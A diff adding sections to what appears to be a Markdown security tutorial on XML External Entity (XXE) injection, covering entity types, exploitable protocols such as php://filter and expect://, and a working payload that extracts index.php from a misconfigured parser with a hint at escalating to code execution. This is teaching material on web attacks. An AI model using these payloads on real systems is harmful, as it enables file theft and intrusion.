@@ -108,15 +108,79 @@ Internal entities are those whose definitions can be found entirely within a doc
         
     ]
 >
+
+<example>
+    <data>&entity_name;</data>
+</example>
 ```
 
 ### External Entities
 
-External entities
+External entities are entities that have data defined outside the DTD. We can make an entity external by using the SYSTEM keyword. An example external entity looks something like this:
+
+```xml
+<!DOCTYPE example
+    [
+        <!ENTITY ext_entity_name SYSTEM "<data_to_fetch>">
+        
+    ]
+>
+
+<example>
+    <data>&ext_entity_name;</data>
+</example>
+```
+
+The `<data_to_fetch>` field by default searches for a file on the server. You can change the behaviour by prepending a protocol (just like in an `include` in php). Depending on the parser used, some of many following protocols can be exploited:
+
+- `php://filter/` - data extraction (using base64-encode)
+- `file://` - data extraction (only when no forbidden chars exist within file)
+- `http://` - Out-of-band ping/extraction + custom DTD to extract data.
+- `expect://` - RCE (if it is enabled for some reason).
+- `data:` - WAF bypass? (custom DTD to extract data through base64 encoded payload).
+
+### Parameterized Entities
+
+Parameterized Entities are entities that can only be using inside the DTD (inside the `<!DOCTYPE>` tag). This is in some cases useful when you want to extract data which contains forbidden characters, like `<` or `>`. An example of parameterized entities can look the following:
+
+```xml
+<!DOCTYPE example
+    [
+        <!ENTITY % param_entity_name "<!ENTITY funny_ent 'lol'>">
+        <!ENTITY % ext_param_entity_name SYSTEM "<data_to_fetch>">
+        %param_entity_name;
+        %ext_param_entity_name;
+    ]
+>
+
+<example>
+    <data>&funny_ent;</data>
+    <data2>&ext_funny_ent;</data2>
+</example>
+```
 
 ## How does the attack work?
 
-TODO
+The attack works by injecting a DTD with a malicious External Entity. Let's say that we have a vulnerable website which has an incorrectly configured XML parser; we can first try to inject our own DTD into our web request:
+
+```xml
+<!DOCTYPE data
+    [
+        <!ENTITY hello SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+    ]
+>
+
+<data>
+    <command>echo_back</command>
+    <args>
+        <arg>
+            &hello;
+        </arg>
+    </args>
+</data>
+```
+
+This can cause an error or successfully extract the source code of `index.php` which would be base64 encoded (since `<` and `>` are forbidden). We can then try to escalate to RCE with the same methods as in an LFI attack.
 
 ## Resources
 
